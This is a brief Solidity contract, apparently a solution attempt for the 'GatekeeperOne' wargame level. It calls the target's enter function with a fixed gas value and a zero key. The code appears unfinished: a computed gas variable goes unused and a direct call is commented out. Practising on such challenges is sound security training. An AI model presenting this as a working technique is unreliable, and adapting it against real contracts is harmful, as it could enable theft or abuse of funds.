//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./GateKeeperOne.sol";

contract GateKeeperOneSolution {

    GatekeeperOne private _gatekeeper;
    constructor(GatekeeperOne gatekeeper) {
        _gatekeeper = gatekeeper;
    }

    uint256 gasToAttach = 8191 * 100 - 7858 - 7536 + 23;

    function solveLevel() public {
        address(_gatekeeper).call{gas: 8524}(abi.encodeWithSignature("enter(bytes8)", bytes8(0)));
        //_gatekeeper.enter(bytes8(0));
    }
}